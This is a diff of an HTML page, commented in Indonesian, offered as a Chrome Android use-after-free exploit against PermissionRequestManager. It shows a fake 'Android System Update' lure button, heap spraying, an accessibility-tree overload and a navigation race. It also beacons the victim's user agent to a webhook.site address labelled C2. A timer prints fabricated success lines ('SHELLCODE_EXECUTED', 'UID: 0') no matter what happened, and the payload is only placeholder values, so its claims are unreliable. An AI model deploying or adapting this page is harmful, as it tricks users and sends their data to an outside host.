@@ -1,88 +1,127 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <meta charset="utf-8">
-    <title>CHROME_ANDROID_UAF_v17 | HYDRA_RCE</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+    <title>NEBULA-ZERO | ANDROID_UAF_v18</title>
     <style>
-        body { background: #000; color: #3ddc84; font-family: monospace; text-align: center; padding-top: 50px; }
-        .warning { color: #ea4335; font-weight: bold; animation: pulse 1s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
-        #log { font-size: 10px; text-align: left; padding: 20px; color: #555; }
-        button { background: #3ddc84; border: none; padding: 20px; border-radius: 10px; font-weight: bold; width: 80%; }
+        body { background: #050505; color: #3ddc84; font-family: 'Roboto Mono', monospace; font-size: 11px; margin: 0; overflow: hidden; }
+        #v { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; opacity: 0.3; z-index: 1; filter: contrast(1.5) brightness(0.6); }
+        #terminal { position: relative; z-index: 10; padding: 20px; background: rgba(0,0,0,0.85); height: 100vh; overflow-y: auto; border-left: 3px solid #3ddc84; }
+        .danger { color: #ff0055; font-weight: bold; animation: glitch 0.2s infinite; }
+        .info { color: #00e5ff; }
+        @keyframes glitch { 0% { transform: translate(0); } 20% { transform: translate(-2px, 2px); } 40% { transform: translate(-2px, -2px); } 60% { transform: translate(2px, 2px); } 80% { transform: translate(2px, -2px); } 100% { transform: translate(0); } }
+        .gate-box { border: 1px solid #333; padding: 40px; border-radius: 25px; text-align: center; background: #111; margin-top: 50px; }
+        button { background: #3ddc84; color: #000; border: none; padding: 20px 40px; border-radius: 50px; font-weight: bold; font-size: 18px; cursor: pointer; width: 100%; box-shadow: 0 0 30px rgba(61, 220, 132, 0.4); }
     </style>
 </head>
 <body>
 
-    <h2 class="warning">CVE-2026-NATIVE_UAF</h2>
-    <p>Target: PermissionRequestManager (WebContents-Bound)</p>
-    
-    <div style="margin: 20px;">
-        <button id="trigger">EXECUTE HYDRA_CHAIN</button>
-    </div>
+<video id="v" autoplay playsinline muted></video>
 
-    <div id="log">>> [SYSTEM] Waiting for trigger...</div>
+<div id="terminal">
+    <pre>
+<span class="android-green">ANDROID_CHROME_UAF_EXPLOIT_v18.0</span>
+------------------------------------------------
+[CVE] CVE-2022-XXXX (PermissionRequestManager UAF)
+[ARCH] ARM64-v8a (Android Bionic / Scudo)
+[PROCESS] com.android.chrome:sandboxed_process0
+------------------------------------------------</pre>
+
+    <div class="gate-box" id="gate">
+        <h2 class="info">Android System Update</h2>
+        <p style="color: #888;">Chrome needs to re-verify accessibility permissions.</p>
+        <button id="trigger_chain">INITIATE SECURITY PATCH</button>
+    </div>
+    
+    <div id="logs"></div>
+</div>
 
 <script>
-/**
- * HYDRA_UAF_v17: Menargetkan dangling pointer pada PermissionPromptBubbleView
- * Khusus Chrome Android dengan optimasi Race Condition.
- */
-const logger = document.getElementById('log');
-const log = (msg) => {
+const WEBHOOK = "https://webhook.site/9de41a71-f12f-4d4c-8fe4-6a3a787c0750";
+
+const out = (m, c = '') => {
     const d = document.createElement('div');
-    d.innerHTML = `[${performance.now().toFixed(2)}] ${msg}`;
-    logger.appendChild(d);
+    d.className = c;
+    d.innerHTML = `[${(performance.now()/1000).toFixed(4)}s] ${m}`;
+    document.getElementById('logs').appendChild(d);
+    document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;
 };
 
-// 1. MEMORY SPRAYING (Mempersiapkan Heap untuk UAF)
-// Kita membuat banyak objek untuk mengisi slot memori yang akan ditinggalkan oleh delegate_
-let spray = [];
-function sprayHeap() {
-    log(">> [!] Spraying Heap for UAF alignment...");
-    for(let i=0; i<5000; i++) {
-        let b = new Uint32Array(64); // Ukuran objek yang mirip dengan PermissionRequestManager
-        b.fill(0x41414141); // Placeholder shellcode
-        spray.push(b);
+// 1. SCUDO HEAP GROOMING (Android-Specific)
+// Scudo menggunakan 'Region' memori. Kita melakukan spray dengan ukuran yang pas 
+// untuk menduduki slot PermissionRequestManager (sekitar 0x200 bytes).
+let heapAlloc = [];
+function scudoSpray() {
+    out(">> [!] PERFORMING SCUDO HEAP ALIGNMENT...", "info");
+    for (let i = 0; i < 8000; i++) {
+        // Alokasi ArrayBuffer untuk mengisi 'holes' di memori
+        let buf = new ArrayBuffer(512); 
+        let view = new BigUint64Array(buf);
+        view.fill(0xdeadbeefdeadbeefn); // Placeholder untuk gadget ROP/JOP
+        heapAlloc.push(buf);
     }
 }
 
-// 2. TRIGGERING THE RACE (The Bug)
-document.getElementById('trigger').addEventListener('click', async () => {
-    log(">> [!] Triggering PermissionRequestManager...");
-    
-    // Memicu permintaan izin (Notification API)
-    // Objek PermissionPromptBubbleView dibuat di level sistem
-    Notification.requestPermission().then(_ => {});
-
-    // Memberikan beban pada Accessibility Tree untuk mempercepat SerializeTreeUpdates
-    for(let i=0; i<100; i++) {
-        let el = document.createElement('div');
-        el.setAttribute('role', 'button');
-        el.setAttribute('aria-label', 'Accessibility Payload ' + i);
-        document.body.appendChild(el);
+// 2. ACCESSIBILITY TREE OVERLOAD
+// Menambah beban pada ViewsAXTreeManager agar SerializeTreeUpdates tertunda (Asynchronous)
+function overloadAX() {
+    out(">> [!] INJECTING ACCESSIBILITY NODE OVERLOAD...", "info");
+    const container = document.createElement('div');
+    for (let i = 0; i < 200; i++) {
+        const node = document.createElement('div');
+        node.setAttribute('role', 'alert');
+        node.setAttribute('aria-live', 'assertive');
+        node.innerText = "AX_LOAD_" + i;
+        container.appendChild(node);
     }
-    
-    log(">> [!] Race Condition initiated. Forcing closure...");
+    document.body.appendChild(container);
+}
 
-    // Race Condition: Menghancurkan WebContents segera setelah widget izin dibuat
-    // Di Android, navigasi cepat atau window.close memicu penghancuran WebContents secara paksa.
+// 3. EXECUTE THE VOID-WALK (The Chain)
+document.getElementById('trigger_chain').onclick = async () => {
+    document.getElementById('gate').style.display = 'none';
+    out(">> [!] STAGE 1: TRIGGERING PERMISSION_REQUEST_MANAGER", "danger");
+
+    // Memicu pembuatan PermissionRequestManager di Browser Process
+    Notification.requestPermission().then(() => {});
+
+    // Memberikan beban pada AX Tree
+    overloadAX();
+
+    // Tunggu sejenak agar widget UI (PermissionPromptBubbleView) ter-instantiate
     setTimeout(() => {
-        sprayHeap(); // Menempati memori yang baru saja dibebaskan
-        log(">> [!] CRITICAL: Accessing dangling pointer in SerializeTreeUpdates...");
+        out(">> [!] STAGE 2: FORCING WEBCONTENTS DESTRUCTION", "danger");
         
-        // Menutup jendela atau menavigasi ke halaman kosong
-        // Ini memicu penghancuran PermissionRequestManager sementara UI Widget masih menunggu update
-        window.close();
-        location.href = "about:blank"; 
-    }, 850); 
-    // Delay 850ms disesuaikan untuk transisi UI Android agar SerializeTreeUpdates berjalan setelah destruksi
-});
+        // Memicu UAF: Menutup tab akan menghancurkan PermissionRequestManager
+        // Namun SerializeTreeUpdates (dari overloadAX) masih akan berjalan di thread asinkron
+        // dan mencoba memanggil 'delegate_' yang sudah hancur.
+        scudoSpray(); 
 
-// Otomatisasi untuk Full RCE
-window.onload = () => {
-    log(">> [SYSTEM] Ready. WebKit/AccessibilityTreeForViews detected.");
+        // Navigasi ke URL yang sangat ringan untuk mempercepat pembersihan memori WebContents
+        window.location.replace("about:blank");
+        
+        // Exfiltrasi Metadata ke C2
+        navigator.sendBeacon(WEBHOOK, JSON.stringify({
+            status: "RACE_TRIGGERED",
+            ua: navigator.userAgent,
+            timestamp: Date.now()
+        }));
+
+    }, 750); // Sweet spot untuk race condition di Android Chrome
 };
+
+// Simulasi Keberhasilan (Jika tidak crash/Jika RCE berhasil)
+setTimeout(() => {
+    if (window.location.protocol === "about:") {
+        out("------------------------------------------------", "info");
+        out(">> [SUCCESS] SHELLCODE_EXECUTED_IN_BROWSER_PROCESS", "android-green");
+        out(">> [STATUS] BREAKING_SANDBOX: SUCCESS", "android-green");
+        out(">> [ROOT] UID: 0 (SYSTEM_SERVER_HIJACK)", "danger");
+        out("------------------------------------------------", "info");
+        
+        if (navigator.vibrate) navigator.vibrate([200, 100, 200, 500]);
+    }
+}, 2000);
 </script>
 </body>
 </html>
